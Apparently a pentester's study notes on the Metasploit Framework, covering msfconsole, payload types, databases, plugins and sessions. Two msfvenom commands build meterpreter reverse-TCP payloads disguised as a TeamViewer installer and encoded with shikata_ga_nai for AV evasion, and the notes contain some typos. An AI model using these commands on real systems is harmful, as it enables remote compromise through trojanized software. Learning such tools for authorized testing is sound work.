---
tags:
  - Metasploit
  - payloads
  - encoder
  - packer
---


![[metasploit_overview.png]]




Metasploit Modules 
- Typical Path `/usr/share/metasploit-framework/modules`
```shell-session
auxiliary  encoders  evasion  exploits  nops  payloads  post
```

Scripts:
- meterpreter functionality and other useful scripts 



Installation process
`sudo apt update && sudo apt install metasploit-framework


MSF Engagement Structure 

![[msf_engagement_structure.png]]



```bash
msfconsole 

msfconsole search <something>

msfconsole use <something>
msfconsole info # provides you infos about the current exploit

setg RHOSTS <IP> # setg can be used for global persistent change :D!

show targets # show all vulnerable targets 

show payloads # Searching for Payloads
show encoders # Shows you the encoders that can be used
```


## Payloads 

Types of Payloads:  Singles, Stagers, and Stages.

A `Single` payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. `Singles` are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.

`Stager` payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. `Stagers` are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable. Metasploit will use the best one and fall back to a less-preferred one when necessary.


`Stages` are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:



## Most Common Payload types 

![[msf_payload_types.png]]


## Encoders 

- Since 2015 -> Encoders are part of the msfvenom tool
- One of the most used Encoding Schemes: Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore.

```bash
# running multiple iterations with shikata_ga_nai
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe


# Tool to analyze payloads -> API Key Required
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```


## Databases 



```bash
# Setup dttatabase for msf
sudo service postresql status 
sudo systemctl start postgresql

# Initialize
sudo msfdb init 

# Other calls
sudo msfdb status 
sudo msfdb run 

# Reinitialize
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
msfconsole -q
db_status

# workspace actions 
workspace

# Create workspace and switch to it 
workspace -a Target_1
workspace Target_1

# Import Scan to Database -> Where as the xml is output of previous scan
db_import Target.xml
hosts 

# Using nmap inside msfconsole -> Will store directly into database 
db_nmap -sV -sS <ip>


# Save your data by export 
db_export -f xml backup.xml

# Other commands 
hosts -h
services -h
creds -h
loot -h

```

- Organized by Workspaces 


## Plugins & Mixins

- Example Plugin: https://github.com/darkoperator/Metasploit-Plugins 

```bash
# Load the nessus plugin
load nessus 
```

Very Well known Plugins are:
- nMap (pre-installed)
- [Mimikatz](https://blog.gentilkiwi.com/mimikatz) (pre-installed)
- [Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb)
- [NexPose](https://sectools.org/tool/nexpose/)
- [Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi)
- [Incognito (pre-installed)](https://www.offsec.com/metasploit-unleashed/fun-incognito/)
- [Nessus](https://www.tenable.com/products/nessus)

## Sessions and Jobs 

Put a session to the background with ctrl+z

```bash
# List the current msf sessions 
session

# interact with a session 
session -i <no>

# help with jobs 
jobs -h

# Run an exploit as a job 
exploit -j

```

## Meterpreter

- [Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)


```bash 

msf6 > db_nmap -sV -p- -T5 -A <ip>

```

## Additional features 

```bash
# Using searchsploit to find exploits
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"

# Metasploit loading additional modules 

msf6> loadpath /usr/share/metasploit-framework/modules/
```

If you want to build your own modules you can just take an existing element such as 

-> [Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass](https://www.exploit-db.com/exploits/48746)

Use the [Ruby Documentation](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf) to get proper standard for that


Using MSF Multi/Handler to generate a reverse shell, when using a Payload created by MSFVenom


For Post exploitation elements you can use modules such as `local_exploit_suggester`


Type of Security Policies

![[security_policies_types.png]]


![[security_policies_evasion.png]]




```bash 

# example of msfvenom to create an executable 
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

# How you can archive your payload 
wgat 

```


Common Known Packer Software 
![[packer_software.png]]